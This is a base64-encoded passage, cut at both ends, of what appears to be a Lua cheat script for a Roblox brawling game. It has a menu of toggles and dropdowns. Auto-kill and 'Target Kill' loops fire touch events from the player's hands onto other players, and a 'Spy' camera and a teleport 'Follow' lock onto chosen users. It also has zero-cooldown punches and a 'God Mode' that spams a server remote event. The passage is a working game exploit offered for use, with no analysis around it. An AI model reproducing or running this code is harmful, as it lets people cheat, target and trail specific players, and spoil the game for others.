DYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgIGF1dG9LaWxsID0gc3RhdGUKCiAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgIHdoaWxlIGF1dG9LaWxsIGRvCiAgICAgICAgICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIgb3IgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6V2FpdCgpCiAgICAgICAgICAgICAgICBsb2NhbCByaWdodEhhbmQgPSBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIlJpZ2h0SGFuZCIpCiAgICAgICAgICAgICAgICBsb2NhbCBsZWZ0SGFuZCA9IGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiTGVmdEhhbmQiKQoKICAgICAgICAgICAgICAgIGxvY2FsIHB1bmNoID0gTG9jYWxQbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoIlB1bmNoIikKICAgICAgICAgICAgICAgIGlmIHB1bmNoIGFuZCBub3QgY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJQdW5jaCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICBwdW5jaC5QYXJlbnQgPSBjaGFyYWN0ZXIKICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIGlmIHJpZ2h0SGFuZCBhbmQgbGVmdEhhbmQgdGhlbgogICAgICAgICAgICAgICAgICAgIGZvciBfLCB0YXJnZXQgaW4gaXBhaXJzKFBsYXllcnM6R2V0UGxheWVycygpKSBkbwogICAgICAgICAgICAgICAgICAgICAgICBpZiB0YXJnZXQgfj0gTG9jYWxQbGF5ZXIgYW5kIG5vdCBwbGF5ZXJXaGl0ZWxpc3RbdGFyZ2V0Lk5hbWVdIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHRhcmdldENoYXIgPSB0YXJnZXQuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCByb290UGFydCA9IHRhcmdldENoYXIgYW5kIHRhcmdldENoYXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgcm9vdFBhcnQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3QocmlnaHRIYW5kLCByb290UGFydCwgMSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3QobGVmdEhhbmQsIHJvb3RQYXJ0LCAxKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdChyaWdodEhhbmQsIHJvb3RQYXJ0LCAwKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdChsZWZ0SGFuZCwgcm9vdFBhcnQsIDApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMDUpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZCkKICAgIGVuZAp9KQoKLS0gVGFyZ2V0IEtpbGwgU2VjdGlvbgpLaWxsc1RhYjpTZWN0aW9uKHtUaXRsZSA9ICJUYXJnZXQgS2lsbCJ9KQoKbG9jYWwgdGFyZ2V0RHJvcGRvd24gPSBLaWxsc1RhYjpEcm9wZG93bih7CiAgICBUaXRsZSA9ICJTZWxlY3QgVGFyZ2V0IiwKICAgIExpc3QgPSB7fSwKICAgIFZhbHVlID0gIiIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKG5hbWUpCiAgICAgICAgaWYgbmFtZSBhbmQgbm90IHRhYmxlLmZpbmQodGFyZ2V0UGxheWVyTmFtZXMsIG5hbWUpIHRoZW4KICAgICAgICAgICAgdGFibGUuaW5zZXJ0KHRhcmdldFBsYXllck5hbWVzLCBuYW1lKQogICAgICAgIGVuZAogICAgZW5kCn0pCgotLSBQb3B1bGF0ZSB0YXJnZXQgZHJvcGRvd24KZm9yIF8sIHBsYXllciBpbiBpcGFpcnMoUGxheWVyczpHZXRQbGF5ZXJzKCkpIGRvCiAgICBpZiBwbGF5ZXIgfj0gTG9jYWxQbGF5ZXIgdGhlbgogICAgICAgIHRhcmdldERyb3Bkb3duOkFkZChwbGF5ZXIuTmFtZSkKICAgICAgICB0YXJnZXREcm9wZG93bkl0ZW1zW3BsYXllci5OYW1lXSA9IHRydWUKICAgIGVuZAplbmQKClBsYXllcnMuUGxheWVyQWRkZWQ6Q29ubmVjdChmdW5jdGlvbihwbGF5ZXIpCiAgICBpZiBwbGF5ZXIgfj0gTG9jYWxQbGF5ZXIgdGhlbgogICAgICAgIHRhcmdldERyb3Bkb3duOkFkZChwbGF5ZXIuTmFtZSkKICAgICAgICB0YXJnZXREcm9wZG93bkl0ZW1zW3BsYXllci5OYW1lXSA9IHRydWUKICAgIGVuZAplbmQpCgpQbGF5ZXJzLlBsYXllclJlbW92aW5nOkNvbm5lY3QoZnVuY3Rpb24ocGxheWVyKQogICAgaWYgdGFyZ2V0RHJvcGRvd25JdGVtc1twbGF5ZXIuTmFtZV0gdGhlbgogICAgICAgIHRhcmdldERyb3Bkb3duSXRlbXNbcGxheWVyLk5hbWVdID0gbmlsCiAgICAgICAgdGFyZ2V0RHJvcGRvd246Q2xlYXIoKQogICAgICAgIGZvciBuYW1lIGluIHBhaXJzKHRhcmdldERyb3Bkb3duSXRlbXMpIGRvCiAgICAgICAgICAgIHRhcmdldERyb3Bkb3duOkFkZChuYW1lKQogICAgICAgIGVuZAogICAgZW5kCgogICAgZm9yIGkgPSAjdGFyZ2V0UGxheWVyTmFtZXMsIDEsIC0xIGRvCiAgICAgICAgaWYgdGFyZ2V0UGxheWVyTmFtZXNbaV0gPT0gcGxheWVyLk5hbWUgdGhlbgogICAgICAgICAgICB0YWJsZS5yZW1vdmUodGFyZ2V0UGxheWVyTmFtZXMsIGkpCiAgICAgICAgZW5kCiAgICBlbmQKZW5kKQoKS2lsbHNUYWI6VGV4dGJveCh7CiAgICBUaXRsZSA9ICJSZW1vdmUgVGFyZ2V0IiwKICAgIERlc2MgPSAiUmVtb3ZlIHBsYXllciBmcm9tIHRhcmdldCBsaXN0IiwKICAgIFBsYWNlaG9sZGVyID0gIlBsYXllciBOYW1lIiwKICAgIFZhbHVlID0gIiIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKG5hbWUpCiAgICAgICAgZm9yIGksIHYgaW4gaXBhaXJzKHRhcmdldFBsYXllck5hbWVzKSBkbwogICAgICAgICAgICBpZiB2ID09IG5hbWUgdGhlbgogICAgICAgICAgICAgICAgdGFibGUucmVtb3ZlKHRhcmdldFBsYXllck5hbWVzLCBpKQogICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKfSkKCktpbGxzVGFiOlRvZ2dsZSh7CiAgICBUaXRsZSA9ICJTdGFydCBLaWxsIFRhcmdldCIsCiAgICBEZXNjID0gIktpbGwgc2VsZWN0ZWQgdGFyZ2V0cyBvbmx5IiwKICAgIFZhbHVlID0gZmFsc2UsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgIGtpbGxUYXJnZXQgPSBzdGF0ZQoKICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgd2hpbGUga2lsbFRhcmdldCBkbwogICAgICAgICAgICAgICAgbG9jYWwgY2hhcmFjdGVyID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIG9yIExvY2FsUGxheWVyLkNoYXJhY3RlckFkZGVkOldhaXQoKQoKICAgICAgICAgICAgICAgIGxvY2FsIHB1bmNoID0gTG9jYWxQbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoIlB1bmNoIikKICAgICAgICAgICAgICAgIGlmIHB1bmNoIGFuZCBub3QgY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJQdW5jaCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICBwdW5jaC5QYXJlbnQgPSBjaGFyYWN0ZXIKICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIGxvY2FsIHJpZ2h0SGFuZCA9IGNoYXJhY3RlcjpXYWl0Rm9yQ2hpbGQoIlJpZ2h0SGFuZCIsIDUpCiAgICAgICAgICAgICAgICBsb2NhbCBsZWZ0SGFuZCA9IGNoYXJhY3RlcjpXYWl0Rm9yQ2hpbGQoIkxlZnRIYW5kIiwgNSkKCiAgICAgICAgICAgICAgICBpZiByaWdodEhhbmQgYW5kIGxlZnRIYW5kIHRoZW4KICAgICAgICAgICAgICAgICAgICBmb3IgXywgbmFtZSBpbiBpcGFpcnModGFyZ2V0UGxheWVyTmFtZXMpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHRhcmdldCA9IFBsYXllcnM6RmluZEZpcnN0Q2hpbGQobmFtZSkKICAgICAgICAgICAgICAgICAgICAgICAgaWYgdGFyZ2V0IGFuZCB0YXJnZXQgfj0gTG9jYWxQbGF5ZXIgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgcm9vdFBhcnQgPSB0YXJnZXQuQ2hhcmFjdGVyIGFuZCB0YXJnZXQuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHJvb3RQYXJ0IHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KHJpZ2h0SGFuZCwgcm9vdFBhcnQsIDEpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KGxlZnRIYW5kLCByb290UGFydCwgMSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3QocmlnaHRIYW5kLCByb290UGFydCwgMCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3QobGVmdEhhbmQsIHJvb3RQYXJ0LCAwKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjA1KQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbmQKfSkKCi0tIFNweSBTZWN0aW9uCktpbGxzVGFiOlNlY3Rpb24oe1RpdGxlID0gIlNweSJ9KQoKbG9jYWwgc3B5VGFyZ2V0RHJvcGRvd24gPSBLaWxsc1RhYjpEcm9wZG93bih7CiAgICBUaXRsZSA9ICJTZWxlY3QgVmlldyBUYXJnZXQiLAogICAgTGlzdCA9IHt9LAogICAgVmFsdWUgPSAiIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24obmFtZSkKICAgICAgICB0YXJnZXRQbGF5ZXJOYW1lID0gbmFtZQogICAgZW5kCn0pCgpmb3IgXywgcGxheWVyIGluIGlwYWlycyhQbGF5ZXJzOkdldFBsYXllcnMoKSkgZG8KICAgIGlmIHBsYXllciB+PSBMb2NhbFBsYXllciB0aGVuCiAgICAgICAgc3B5VGFyZ2V0RHJvcGRvd246QWRkKHBsYXllci5OYW1lKQogICAgZW5kCmVuZAoKUGxheWVycy5QbGF5ZXJBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKHBsYXllcikKICAgIGlmIHBsYXllciB+PSBMb2NhbFBsYXllciB0aGVuCiAgICAgICAgc3B5VGFyZ2V0RHJvcGRvd246QWRkKHBsYXllci5OYW1lKQogICAgZW5kCmVuZCkKClBsYXllcnMuUGxheWVyUmVtb3Zpbmc6Q29ubmVjdChmdW5jdGlvbihwbGF5ZXIpCiAgICBpZiBwbGF5ZXIgfj0gTG9jYWxQbGF5ZXIgdGhlbgogICAgICAgIHNweVRhcmdldERyb3Bkb3duOkNsZWFyKCkKICAgICAgICBmb3IgXywgcGxyIGluIGlwYWlycyhQbGF5ZXJzOkdldFBsYXllcnMoKSkgZG8KICAgICAgICAgICAgaWYgcGxyIH49IExvY2FsUGxheWVyIHRoZW4KICAgICAgICAgICAgICAgIHNweVRhcmdldERyb3Bkb3duOkFkZChwbHIuTmFtZSkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKZW5kKQoKS2lsbHNUYWI6VG9nZ2xlKHsKICAgIFRpdGxlID0gIlZpZXcgUGxheWVyIiwKICAgIERlc2MgPSAiU3BlY3RhdGUgc2VsZWN0ZWQgcGxheWVyIiwKICAgIFZhbHVlID0gZmFsc2UsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgIHNweWluZyA9IHN0YXRlCiAgICAgICAgaWYgbm90IHNweWluZyB0aGVuCiAgICAgICAgICAgIGxvY2FsIGNhbSA9IHdvcmtzcGFjZS5DdXJyZW50Q2FtZXJhCiAgICAgICAgICAgIGNhbS5DYW1lcmFTdWJqZWN0ID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIGFuZCBMb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikgb3IgTG9jYWxQbGF5ZXIKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgZW5kCiAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgIHdoaWxlIHNweWluZyBkbwogICAgICAgICAgICAgICAgbG9jYWwgdGFyZ2V0ID0gUGxheWVyczpGaW5kRmlyc3RDaGlsZCh0YXJnZXRQbGF5ZXJOYW1lKQogICAgICAgICAgICAgICAgaWYgdGFyZ2V0IGFuZCB0YXJnZXQgfj0gTG9jYWxQbGF5ZXIgdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIGh1bWFub2lkID0gdGFyZ2V0LkNoYXJhY3RlciBhbmQgdGFyZ2V0LkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKQogICAgICAgICAgICAgICAgICAgIGlmIGh1bWFub2lkIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgd29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ2FtZXJhU3ViamVjdCA9IGh1bWFub2lkCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjEpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZCkKICAgIGVuZAp9KQoKLS0gQ29tYmF0IFNlY3Rpb24KS2lsbHNUYWI6U2VjdGlvbih7VGl0bGUgPSAiQ29tYmF0In0pCgpLaWxsc1RhYjpUb2dnbGUoewogICAgVGl0bGUgPSAiQXV0byBIaXQgTm8gQW5pbSIsCiAgICBEZXNjID0gIlJhcGlkIHB1bmNoIHdpdGhvdXQgYW5pbWF0aW9uIiwKICAgIFZhbHVlID0gZmFsc2UsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgIGF1dG9QdW5jaE5vQW5pbSA9IHN0YXRlCiAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgIHdoaWxlIGF1dG9QdW5jaE5vQW5pbSBkbwogICAgICAgICAgICAgICAgbG9jYWwgcHVuY2ggPSBMb2NhbFBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiUHVuY2giKSBvciBMb2NhbFBsYXllci5DaGFyYWN0ZXIgYW5kIExvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiUHVuY2giKQogICAgICAgICAgICAgICAgaWYgcHVuY2ggdGhlbgogICAgICAgICAgICAgICAgICAgIGlmIHB1bmNoLlBhcmVudCB+PSBMb2NhbFBsYXllci5DaGFyYWN0ZXIgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBwdW5jaC5QYXJlbnQgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBMb2NhbFBsYXllci5tdXNjbGVFdmVudDpGaXJlU2VydmVyKCJwdW5jaCIsICJyaWdodEhhbmQiKQogICAgICAgICAgICAgICAgICAgIExvY2FsUGxheWVyLm11c2NsZUV2ZW50OkZpcmVTZXJ2ZXIoInB1bmNoIiwgImxlZnRIYW5kIikKICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICBhdXRvUHVuY2hOb0FuaW0gPSBmYWxzZQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4wMSkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kKQogICAgZW5kCn0pCgpLaWxsc1RhYjpUb2dnbGUoewogICAgVGl0bGUgPSAiUXVpY2sgSGl0IiwKICAgIERlc2MgPSAiRmFzdCBwdW5jaCB3aXRoIG5vIGRlbGF5IiwKICAgIFZhbHVlID0gZmFsc2UsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgIF9HLmF1dG9QdW5jaEFjdGl2ZSA9IHN0YXRlCiAgICAgICAgaWYgc3RhdGUgdGhlbgogICAgICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIHdoaWxlIF9HLmF1dG9QdW5jaEFjdGl2ZSBkbwogICAgICAgICAgICAgICAgICAgIGxvY2FsIHB1bmNoID0gTG9jYWxQbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoIlB1bmNoIikKICAgICAgICAgICAgICAgICAgICBpZiBwdW5jaCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHB1bmNoLlBhcmVudCA9IExvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgICAgICBpZiBwdW5jaDpGaW5kRmlyc3RDaGlsZCgiYXR0YWNrVGltZSIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHB1bmNoLmF0dGFja1RpbWUuVmFsdWUgPSAwCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQogICAgICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIHdoaWxlIF9HLmF1dG9QdW5jaEFjdGl2ZSBkbwogICAgICAgICAgICAgICAgICAgIGxvY2FsIHB1bmNoID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIGFuZCBMb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIlB1bmNoIikKICAgICAgICAgICAgICAgICAgICBpZiBwdW5jaCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHB1bmNoOkFjdGl2YXRlKCkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkKICAgICAgICBlbHNlCiAgICAgICAgICAgIGxvY2FsIHB1bmNoID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIGFuZCBMb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIlB1bmNoIikKICAgICAgICAgICAgaWYgcHVuY2ggdGhlbgogICAgICAgICAgICAgICAgcHVuY2guUGFyZW50ID0gTG9jYWxQbGF5ZXIuQmFja3BhY2sKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKfSkKCi0tIEdvZCBNb2RlIFNlY3Rpb24KS2lsbHNUYWI6U2VjdGlvbih7VGl0bGUgPSAiR29kIE1vZGUifSkKCktpbGxzVGFiOlRvZ2dsZSh7CiAgICBUaXRsZSA9ICJHb2QgTW9kZSIsCiAgICBEZXNjID0gIkludmluY2liaWxpdHkgaW4gYnJhd2xzIiwKICAgIFZhbHVlID0gZmFsc2UsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgIGdvZE1vZGVUb2dnbGUgPSBzdGF0ZQogICAgICAgIGlmIHN0YXRlIHRoZW4KICAgICAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgICAgICB3aGlsZSBnb2RNb2RlVG9nZ2xlIGRvCiAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpLnJFdmVudHMuYnJhd2xFdmVudDpGaXJlU2VydmVyKCJqb2luQnJhd2wiKQogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQogICAgICAgIGVuZAogICAgZW5kCn0pCgpLaWxsc1RhYjpUb2dnbGUoewogICAgVGl0bGUgPSAiRGFtYWdlIFdpdGggR29kbW9kZSIsCiAgICBEZXNjID0gIkRlYWwgZGFtYWdlIHdoaWxlIGluIGdvZCBtb2RlIiwKICAgIFZhbHVlID0gZmFsc2UsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgIGdvZERhbWFnZUFjdGl2ZSA9IHN0YXRlCiAgICAgICAgaWYgc3RhdGUgdGhlbgogICAgICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIHdoaWxlIGdvZERhbWFnZUFjdGl2ZSBkbwogICAgICAgICAgICAgICAgICAgIGxvY2FsIHBsYXllciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcgogICAgICAgICAgICAgICAgICAgIGxvY2FsIGdyb3VuZFNsYW0gPSBwbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoIkdyb3VuZCBTbGFtIikgb3IgKHBsYXllci5DaGFyYWN0ZXIgYW5kIHBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkdyb3VuZCBTbGFtIikpCgogICAgICAgICAgICAgICAgICAgIGlmIGdyb3VuZFNsYW0gdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBpZiBncm91bmRTbGFtLlBhcmVudCA9PSBwbGF5ZXIuQmFja3BhY2sgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZ3JvdW5kU2xhbS5QYXJlbnQgPSBwbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICAgICAgaWYgZ3JvdW5kU2xhbTpGaW5kRmlyc3RDaGlsZCgiYXR0YWNrVGltZSIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdyb3VuZFNsYW0uYXR0YWNrVGltZS5WYWx1ZSA9IDAKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgICAgICAgICBwbGF5ZXIubXVzY2xlRXZlbnQ6RmlyZVNlcnZlcigic2xhbSIpCiAgICAgICAgICAgICAgICAgICAgICAgIGdyb3VuZFNsYW06QWN0aXZhdGUoKQogICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4xKSAKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQpCiAgICAgICAgZW5kCiAgICBlbmQKfSkKCi0tIEZvbGxvdyBTZWN0aW9uCktpbGxzVGFiOlNlY3Rpb24oe1RpdGxlID0gIkZvbGxvdyJ9KQoKbG9jYWwgZm9sbG93RHJvcGRvd24gPSBLaWxsc1RhYjpEcm9wZG93bih7CiAgICBUaXRsZSA9ICJGb2xsb3cgUGxheWVyIChUUCkiLAogICAgTGlzdCA9IHt9LAogICAgVmFsdWUgPSAiIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc2VsZWN0ZWQpCiAgICAgICAgaWYgc2VsZWN0ZWQgYW5kIHNlbGVjdGVkIH49ICIiIHRoZW4KICAgICAgICAgICAgbG9jYWwgdGFyZ2V0ID0gUGxheWVyczpGaW5kRmlyc3RDaGlsZChzZWxlY3RlZCkKICAgICAgICAgICAgaWYgdGFyZ2V0IHRoZW4KICAgICAgICAgICAgICAgIGZvbGxvd1RhcmdldCA9IHRhcmdldC5OYW1lCiAgICAgICAgICAgICAgICBmb2xsb3dpbmcgPSB0cnVlCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIC0tIEltbWVkaWF0ZSBUUCB3aGVuIHNlbGVjdGVkCiAgICAgICAgICAgICAgICBsb2NhbCBmdW5jdGlvbiBmb2xsb3dQbGF5ZXIodGFyZ2V0UGxheWVyKQogICAgICAgICAgICAgICAgICAgIGxvY2FsIG15Q2hhciA9IExvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgIGxvY2FsIHRhcmdldENoYXIgPSB0YXJnZXRQbGF5ZXIuQ2hhcmFjdGVyCgogICAgICAgICAgICAgICAgICAgIGlmIG5vdCAobXlDaGFyIGFuZCB0YXJnZXRDaGFyKSB0aGVuIHJldHVybiBlbmQKICAgICAgICAgICAgICAgICAgICBsb2NhbCBteUhSUCA9IG15Q2hhcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgdGFyZ2V0SFJQID0gdGFyZ2V0Q2hhcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCgogICAgICAgICAgICAgICAgICAgIGlmIG15SFJQIGFuZCB0YXJnZXRIUlAgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBmb2xsb3dQb3MgPSB0YXJnZXRIUlAuUG9zaXRpb24gLSAodGFyZ2V0SFJQLkNGcmFtZS5Mb29rVmVjdG9yICogMykKICAgICAgICAgICAgICAgICAgICAgICAgbXlIUlAuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyhmb2xsb3dQb3MsIHRhcmdldEhSUC5Qb3NpdGlvbikKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBmb2xsb3dQbGF5ZXIodGFyZ2V0KQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAp9KQoKLS0gUG9wdWxhdGUgZm9sbG93IGRyb3Bkb3duCmZvciBfLCBwbGF5ZXIgaW4gaXBhaXJzKFBsYXllcnM6R2V0UGxheWVycygpKSBkbwogICAgaWYgcGxheWVyIH49IExvY2FsUGxheWVyIHRoZW4KICAgICAgICBmb2xsb3dEcm9wZG93bjpBZGQocGxheWVyLk5hbWUpCiAgICBlbmQKZW5kCgpQbGF5ZXJzLlBsYXllckFkZGVkOkNvbm5lY3QoZnVuY3Rpb24ocGxheWVyKQogICAgaWYgcGxheWVyIH49IExvY2FsUGxheWVyIHRoZW4KICAgICAgICBmb2xsb3dEcm9wZG93bjpBZGQocGxheWVyLk5hbWUpCiAgICBlbmQKZW5kKQoKUGxheWVycy5QbGF5ZXJSZW1vdmluZzpDb25uZWN0KGZ1bmN0aW9uKHBsYXllcikKICAgIGZvbGxvd0Ryb3Bkb3duOkNsZWFyKCkKICAgIGZvciBfLCBwbHIgaW4gaXBhaXJzKFBsYXllcnM6R2V0UGxheWVycygpKSBkbwogICAgICAgIGlmIHBsciB+PSBMb2NhbFBsYXllciB0aGVuCiAgICAgICAgICAgIGZvbGxvd0Ryb3Bkb3duOkFkZChwbHIuTmFtZSkKICAgICAgICBlbmQKICAgIGVuZAogICAgaWYgZm9sbG93VGFyZ2V0ID09IHBsYXllci5OYW1lIHRoZW4KICAgICAgICBmb2xsb3dUYXJnZXQgPSBuaWwKICAgICAgICBmb2xsb3dpbmcgPSBmYWxzZQogICAgZW5kCmVuZCkKCktpbGxzVGFiOkJ1dHRvbih7CiAgICBUaXRsZSA9ICJVbmZvbGxvdyIsCiAgICBEZXNjID0gIlN0b3AgZm9sbG93aW5nIGN1cnJlbnQgdGFyZ2V0IiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGZvbGxvd2luZyA9IGZhbHNlCiAgICAgICAgZm9sbG93VGFyZ2V0ID0gbmlsCiAgICBlbmQKfSkKCi0tIEZvbGxvdyBsb29wCnRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgd2hpbGUgdHJ1ZSBkbwogICAgICAgIHRhc2sud2FpdCgwLjIpCiAgICAgICAgaWYgZm9sbG93aW5nIGFuZCBmb2x